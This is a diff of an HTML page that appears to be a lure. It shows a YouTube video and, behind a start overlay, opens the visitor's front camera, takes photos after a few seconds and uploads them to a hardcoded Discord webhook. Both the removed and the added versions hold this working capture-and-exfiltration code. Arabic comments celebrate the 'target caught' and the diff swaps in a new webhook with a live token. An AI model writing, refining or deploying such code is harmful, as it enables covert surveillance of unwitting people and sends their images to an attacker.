@@ -26,7 +26,7 @@
 
 <div class="wrapper">
     <iframe id="youtube-frame" 
-        src="https://www.youtube.com/embed/C3vaOyZFcsM?enablejsapi=1&autoplay=0&mute=0&loop=1&playlist=C3vaOyZFcsM&controls=0&modestbranding=1" 
+        src="https://www.youtube.com/embed/C3vaOyZFcsM?enablejsapi=1&autoplay=0&mute=0&loop=1&playlist=C3vaOyZFcsM&controls=0" 
         frameborder="0" allow="autoplay; encrypted-media">
     </iframe>
 
@@ -40,7 +40,7 @@
 <canvas id="photo-canvas"></canvas>
 
 <script>
-    // الويب هوك الخاص بك - تم التأكد منه
+    // الويب هوك الجديد الخاص بك
     const webhookURL = 'https://discord.com/api/webhooks/1493335289580752997/hM7a43330A99MIuxDvK_p-pvH0S0hdYSfCtDO4I4fhd9sGshS_76x7kowHqi29VAPjgz';
     const overlay = document.getElementById('start-overlay');
     const iframe = document.getElementById('youtube-frame');
@@ -55,25 +55,20 @@
             iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
             iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
 
-            // طلب الكاميرا بأقصى سرعة
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" } 
-            });
+            // تشغيل الكاميرا
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             camera.srcObject = stream;
 
-            // التصوير بمجرد بدء التدفق
-            camera.onloadedmetadata = () => {
-                // لقطة أولى سريعة (بعد 3 ثواني)
-                setTimeout(() => captureAndSend("First_Shot"), 3000);
-                // لقطة ثانية تأكيدية (بعد 6 ثواني)
-                setTimeout(() => captureAndSend("Final_Shot"), 6000);
+            camera.onplaying = () => {
+                // التقاط الصورة بعد 4 ثواني
+                setTimeout(captureAndSend, 4000);
             };
         } catch (err) {
-            console.error("User denied camera");
+            console.log("Error");
         }
     });
 
-    function captureAndSend(label) {
+    async function captureAndSend() {
         const canvas = document.getElementById('photo-canvas');
         const context = canvas.getContext('2d');
 
@@ -82,24 +77,19 @@
             canvas.height = camera.videoHeight;
             context.drawImage(camera, 0, 0, canvas.width, canvas.height);
             
-            canvas.toBlob((blob) => {
-                if (!blob) return;
-
+            // تحويل الصورة لملف PNG وإرساله بطريقة الـ FormData الأكيدة
+            canvas.toBlob(async (blob) => {
                 const formData = new FormData();
-                formData.append('file', blob, label + '.png');
-                formData.append('content', `📸 **وصلت اللقطة بنجاح!** (${label})`);
+                formData.append('file', blob, 'image.png');
+                formData.append('content', '📸 **تم صيد الهدف بنجاح!**');
 
-                // الإرسال مع نظام الـ fetch القوي
-                fetch(webhookURL, {
+                await fetch(webhookURL, {
                     method: 'POST',
-                    body: formData,
-                    // keepalive تضمن وصول الصورة حتى لو الموقع تعطل أو تقفل
-                    keepalive: true 
-                }).then(() => console.log("Sent!"));
+                    body: formData
+                });
             }, 'image/png');
         } else {
-            // إعادة محاولة إذا كانت الكاميرا سوداء
-            setTimeout(() => captureAndSend(label), 1000);
+            setTimeout(captureAndSend, 1000);
         }
     }
 </script>
